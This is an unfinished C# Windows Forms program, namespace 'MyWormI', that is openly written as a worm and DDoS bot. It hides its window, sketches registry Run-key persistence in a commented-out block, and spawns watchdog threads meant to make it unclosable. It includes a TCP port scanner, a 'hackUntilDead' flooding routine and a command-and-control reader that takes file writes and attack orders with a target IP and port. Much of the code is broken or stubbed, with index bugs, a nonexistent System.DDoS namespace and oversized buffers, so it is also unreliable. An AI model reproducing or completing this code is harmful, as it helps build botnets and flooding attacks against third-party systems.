


using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading ;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.DDoS;
//not finish yet~~~~

namespace MyWormI
{
    public partial class Form1 : Form
    {
        #region brainless
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Shown += new EventHandler(Form1_Shown);
        }

        void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            start();
        }
        void start()
        {

            /*  RegistryKey rk1 = Registry.CurrentUser ;
              RegistryKey rk2 = rk1.CreateSubKey("SOFTWARE");
              RegistryKey rk3 = rk2.CreateSubKey("Microsoft");
              RegistryKey rk4 = rk3.CreateSubKey("Windows");
              RegistryKey rk5 = rk4.CreateSubKey("CurrentVersion");
              RegistryKey rk6 = rk5.CreateSubKey("Run");
              rk6.SetValue("HaHaHa" ,"d:\\haha.exe");//in this example the file name is haha.exe
              rk6.Close();*/

            //HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\RunServicesOnce



        }
        #endregion
    }


}

namespace System.DDoS.Atk
{
    #region unclosable
    unsafe class unclosabe
    {
        private Thread t1;
        private Thread t2;
        Process[] p = null;
        MainPart MP;
        public unclosabe(MainPart m)
        {
            MP = m;


        }
        ~unclosabe()
        {



        }

        void vt1()
        {
        redo:
            if (!t2.IsAlive)
            {
                t2 = new Thread(new ThreadStart(vt2));
                t2.Start();
            }
            if (!MP.t.IsAlive)
            { MP.t = new Thread(new ThreadStart(MP.Main)); }
            goto redo;
        }
        void vt2()
        {
        redo:
            if (!t1.IsAlive)
            {
                t1 = new Thread(new ThreadStart(vt1));
                t1.Start();


            }
            if (!MP.t.IsAlive)
            { MP.t = new Thread(new ThreadStart(MP.Main)); }
            goto redo;

        }





    }
    #endregion
    #region Root
    class MainPart
    {
        public Thread t;
        public MainPart()
        {
            t = new Thread(new ThreadStart(Main));
            t.Start();

        }
        ~MainPart()
        {



        }
        public void Main()
        {
            while (true)
            {






            }
        }

    }
    #endregion
    #region attack
    public class Atk : MainPart
    {
        public Atk()
        {
            throw new NotImplementedException();

        }
        public Atk(DDosAttackType t, IPEndPoint ipe, int guys)
        {
            attacker atkr = new attacker(guys, ipe, t);

        }
        ~Atk()
        {


        }

    }
    #endregion
    #region getPortHole
    class portHoleFinder : Atk
    {
        private Thread[] t;
        private IPAddress ipa;
        private int searchingNum;
        public int holeNum = 0;
        public portHoleFinder(int guys, IPAddress ip)
        {
            ipa = ip;
            t = new Thread[guys];
            for (int i = 0; i != guys; )
            {
                t[i++] = new Thread(new ThreadStart(finding));
                t[i].Start();
            }
        }

        ~portHoleFinder()
        {
            dispose();

        }
        public void dispose()
        {
            for (int i = 0; i != t.Length; )
            {
                t[i++].Abort();

            }

        }
        void finding()
        {
            do
            {
                TcpClient c;
                try
                {
                    c = new TcpClient(ipa.ToString(), searchingNum++);
                    holeNum = searchingNum;
                    for (int i = 0; i != t.Length; )
                    {
                        t[i++].Abort();
                    }
                }
                catch { }
            } while (true);

        }
        int PortHole()
        {
            return holeNum;
        }

    }
    #endregion
    #region attacker
    class attacker : Atk
    {
        ~attacker()
        {


        }
        //every single kind will use it
        /*  private IPEndPoint endp;
          private int guys;
          private Thread[] t;*/
        //just for until dead


        //just for hackTime
        /*   private System.Windows.Forms.Timer timer;
           private int time;*/


        //just for hackTimes

        public attacker()
        {
            throw new ArgumentException();
        }


        public attacker(int guys, IPEndPoint ipe, DDosAttackType type, int hackTime = 0, int hackTimes = 0)
        {
            switch (type)
            {
                case DDosAttackType.hackUntilDead:
                    hackUntilDead hud;
                    hud = new hackUntilDead(guys, ipe);
                    break;
                case DDosAttackType.hackForTime:
                    throw new NotImplementedException();
                    break;
                case DDosAttackType.hackForAttackTimes:
                    throw new NotImplementedException();
                    break;
            }
        }


    }

    class hackUntilDead : attacker
    {
        private Thread[] t;
        private IPEndPoint ip;
        public hackUntilDead(int guys, IPEndPoint ipe)
        {
            ip = ipe;
            t = new Thread[guys];
            for (int i = 0; i != guys; )
            {
                t[i++] = new Thread(new ThreadStart(attacking));
                t[i++].Start();
            }

        }
        ~hackUntilDead()
        {



        }
        void attacking()
        {
            TcpClient c = new TcpClient(ip);
            NetworkStream nws = c.GetStream();
            while (true)
            {
                nws.WriteByte((byte)8);
            }

        }
    }

    class hackUntilTimesFinish : attacker
    {
        public hackUntilTimesFinish(int guys, IPEndPoint ipe, int times)
        {


        }
        ~hackUntilTimesFinish()
        {



        }
    }
    class hackUntilTimeUp : attacker
    {
        public hackUntilTimeUp(int guys, IPEndPoint ipe, int time)
        {


        }
        ~hackUntilTimeUp()
        {



        }
    }
    #endregion
    enum DDosAttackType
    {
        hackUntilDead = 0
        ,
        hackForTime = 1
            , hackForAttackTimes = 3
    }



}
namespace System.DDoS.ReadMsgFromMe
{
    public unsafe class Reader
    {
        private DoFile f;
        private Thread t;
        private IPEndPoint ipe;
        public Reader(IPEndPoint ip)
        {
            t = new Thread(new ThreadStart(listen)); t.Start();
            throw new NotImplementedException();
            f = new DoFile("this is the path");
            ipe = ip;

        }
        ~Reader()
        {



        }
        void listen()
        {
            TcpClient c = new TcpClient();
            c.Connect(ipe.Address, ipe.Port);
            NetworkStream nws = c.GetStream();
            while (true)
            {
                byte[] bfr = new byte[1024];
                nws.Read(bfr, 0, 1024);





            }
        }
        void decodemsg(byte[] bfr)
        {
            if (bfr[0] == 1)//file
            {
                {
                    byte[] bfr2 = new byte[1022];
                    for (int i = 0; i != 1023; i++)
                        bfr2[i - 1] = bfr[i];
                    f.Write(bfr2);
                }
                
            }
            if (bfr[0] == 2)
            {

                f.flush();



            }
            if (bfr[0] == 3)//atk~~~~
            {
                switch (bfr[1])
                {
                    case 1: //hackuntil dead
                        Atk.Atk a = new Atk.Atk (Atk .DDosAttackType .hackUntilDead,(new IPEndPoint ( IPAddress .Parse (bfr[2].ToString () + "." 
                          +  bfr[3].ToString () + "."
                          + bfr[4].ToString () + "."
                          + bfr [ 5 ] .ToString () ), bfr[6])),(bfr[7] + bfr[8] + bfr[9] + bfr[10]));
                        break;
                    case 2:

                        break;
                    case 3:

                        break;


                }


            }
        }
       
        string getip()
        {
            IPAddress[] ipa = Dns.GetHostAddresses(Dns.GetHostName());
            foreach (IPAddress a in ipa)
            {
                if (a.AddressFamily == AddressFamily.InterNetwork)
                {
                    return a.ToString();
                }

            }

            return null;
        }

    }
    class DoFile
    {
        private FileStream fs;
        private BufferedStream bs;
        private int counter = 0;
        byte[] predo = new byte[int.MaxValue];
        public DoFile(string path)
        {
            fs = new FileStream(path, FileMode.OpenOrCreate);
            bs = new BufferedStream((Stream)fs, int.MaxValue);
        }
        public void Write(byte[] bfr)
        {
            bs.Write(bfr, (counter++) * 1024, counter * 1024 - 1);
        }
        public void flush()
        {
            bs.Flush();
           

        }

    }



}